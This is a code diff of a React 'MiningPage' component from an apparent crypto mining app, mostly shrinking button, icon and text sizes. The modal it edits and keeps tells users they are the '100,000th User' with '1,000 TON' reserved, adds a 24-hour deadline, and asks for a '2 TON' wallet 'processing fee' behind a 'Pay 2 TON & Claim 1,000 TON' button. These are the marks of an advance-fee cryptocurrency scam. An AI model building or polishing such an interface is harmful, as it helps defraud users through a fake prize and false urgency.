@@ -274,41 +274,41 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
       
       {/* Top Navigation Buttons */}
       <div className="fixed top-4 left-0 right-0 z-20 px-4">
-        <div className="flex justify-center space-x-4">
+        <div className="flex justify-center space-x-6">
           {/* 100,000th User Event Button */}
           <div className="flex flex-col items-center">
             <Button 
               onClick={handle100kUserEvent}
-              className="w-14 h-14 rounded-full bg-gradient-to-r from-gold-500 via-yellow-500 to-gold-600 hover:from-gold-600 hover:via-yellow-600 hover:to-gold-700 shadow-xl border-2 border-gold-400/70 hover:scale-110 transition-all duration-300 p-0 animate-pulse"
+              className="w-12 h-12 rounded-full bg-gradient-to-r from-yellow-400 via-gold-500 to-yellow-600 hover:from-yellow-500 hover:via-gold-600 hover:to-yellow-700 shadow-lg border-2 border-yellow-300/60 hover:scale-105 transition-all duration-300 p-0 animate-pulse"
               title="100,000th User Event"
             >
-              <Award className="w-7 h-7 text-white drop-shadow-lg" />
+              <Award className="w-6 h-6 text-white drop-shadow-md" />
             </Button>
-            <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">100k Event</span>
+            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">100k Event</span>
           </div>
 
           {/* Daily Rush Button */}
           <div className="flex flex-col items-center">
             <Button 
               onClick={() => handleQuickNavigation('daily-rush')}
-              className="w-14 h-14 rounded-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 shadow-lg border-2 border-yellow-400/50 hover:scale-110 transition-all duration-300 p-0"
+              className="w-12 h-12 rounded-full bg-gradient-to-r from-yellow-500 to-orange-500 hover:from-yellow-600 hover:to-orange-600 shadow-lg border-2 border-yellow-400/50 hover:scale-105 transition-all duration-300 p-0"
               title="Daily Rush"
             >
-              <Crown className="w-7 h-7 text-white" />
+              <Crown className="w-6 h-6 text-white" />
             </Button>
-            <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">Daily Rush</span>
+            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">Daily Rush</span>
           </div>
           
           {/* Store Button */}
           <div className="flex flex-col items-center">
             <Button 
               onClick={() => handleQuickNavigation('store')}
-              className="w-14 h-14 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 shadow-lg border-2 border-purple-400/50 hover:scale-110 transition-all duration-300 p-0"
+              className="w-12 h-12 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 hover:from-purple-600 hover:to-pink-600 shadow-lg border-2 border-purple-400/50 hover:scale-105 transition-all duration-300 p-0"
               title="Store"
             >
-              <Store className="w-7 h-7 text-white" />
+              <Store className="w-6 h-6 text-white" />
             </Button>
-            <span className="text-white text-xs font-semibold mt-1 drop-shadow-lg">Store</span>
+            <span className="text-white text-xs font-medium mt-1 drop-shadow-lg">Store</span>
           </div>
         </div>
       </div>
@@ -381,53 +381,52 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
         )}
       </div>
 
-      {/* 100k User Event Modal */}
+      {/* 100k User Event Modal - Smaller and More Compact */}
       <Dialog open={show100kModal} onOpenChange={setShow100kModal}>
-        <DialogContent className="bg-gradient-to-br from-blue-900 via-purple-900 to-pink-900 border-2 border-gold-400 text-white max-w-md mx-auto">
+        <DialogContent className="bg-gradient-to-br from-blue-900 via-purple-900 to-pink-900 border-2 border-gold-400 text-white max-w-sm mx-auto">
           <DialogHeader>
-            <DialogTitle className="text-center text-2xl font-bold text-gold-400 mb-4">
-              🎉 Congratulations! 🎉
+            <DialogTitle className="text-center text-lg font-bold text-gold-400 mb-2">
+              🎉 100,000th User! 🎉
             </DialogTitle>
           </DialogHeader>
           
-          <div className="space-y-4 text-center">
-            <div className="bg-black/30 rounded-lg p-4 border border-gold-400/30">
-              <h3 className="text-lg font-bold text-gold-400 mb-2">
-                You Are Our 100,000th User!
+          <div className="space-y-3 text-center">
+            <div className="bg-black/30 rounded-lg p-3 border border-gold-400/30">
+              <h3 className="text-md font-bold text-gold-400 mb-1">
+                Congratulations!
               </h3>
-              <p className="text-sm text-gray-300">
-                You've unlocked a milestone achievement and earned a special reward!
+              <p className="text-xs text-gray-300">
+                You've unlocked a milestone achievement!
               </p>
             </div>
 
-            <div className="bg-green-900/40 rounded-lg p-4 border border-green-400/30">
-              <div className="flex items-center justify-center space-x-2 mb-2">
-                <span className="text-3xl">💎</span>
-                <span className="text-2xl font-bold text-green-400">1,000 TON</span>
+            <div className="bg-green-900/40 rounded-lg p-3 border border-green-400/30">
+              <div className="flex items-center justify-center space-x-2 mb-1">
+                <span className="text-2xl">💎</span>
+                <span className="text-xl font-bold text-green-400">1,000 TON</span>
               </div>
-              <p className="text-sm text-gray-300">Reserved in your name!</p>
+              <p className="text-xs text-gray-300">Reserved for you!</p>
             </div>
 
-            <div className="bg-yellow-900/40 rounded-lg p-3 border border-yellow-400/30">
-              <p className="text-sm text-yellow-200">
+            <div className="bg-yellow-900/40 rounded-lg p-2 border border-yellow-400/30">
+              <p className="text-xs text-yellow-200">
                 ⏰ Valid for 24 hours only
               </p>
             </div>
 
-            <div className="bg-blue-900/40 rounded-lg p-4 border border-blue-400/30">
-              <h4 className="font-semibold text-blue-300 mb-2">To claim your reward:</h4>
-              <p className="text-sm text-gray-300 mb-3">
-                A processing fee of 2 TON is required to verify your wallet and secure the transfer.
+            <div className="bg-blue-900/40 rounded-lg p-3 border border-blue-400/30">
+              <p className="text-xs text-gray-300 mb-2">
+                Processing fee: 2 TON required to verify your wallet
               </p>
               <p className="text-xs text-blue-200">
-                This fee helps us prevent bots and keeps the platform secure for real users.
+                Helps prevent bots and keeps platform secure.
               </p>
             </div>
 
-            <div className="space-y-3 pt-4">
+            <div className="space-y-2 pt-2">
               <Button 
                 onClick={handlePayment}
-                className="w-full bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow-lg hover:scale-105 transition-all duration-300"
+                className="w-full bg-gradient-to-r from-green-500 to-blue-600 hover:from-green-600 hover:to-blue-700 text-white font-bold py-2 px-4 rounded-lg shadow-lg hover:scale-105 transition-all duration-300 text-sm"
               >
                 💳 Pay 2 TON & Claim 1,000 TON
               </Button>
@@ -435,13 +434,13 @@ const MiningPage: React.FC<MiningPageProps> = ({ onNavigate }) => {
               <Button 
                 onClick={() => setShow100kModal(false)}
                 variant="outline"
-                className="w-full border-gray-400 text-gray-300 hover:bg-gray-800"
+                className="w-full border-gray-400 text-gray-300 hover:bg-gray-800 text-sm py-2"
               >
                 Maybe Later
               </Button>
             </div>
 
-            <div className="text-xs text-gray-400 pt-2">
+            <div className="text-xs text-gray-400 pt-1">
               <p>🔐 Secure • 🌟 Trusted • ⚡ Blockchain-powered</p>
             </div>
           </div>
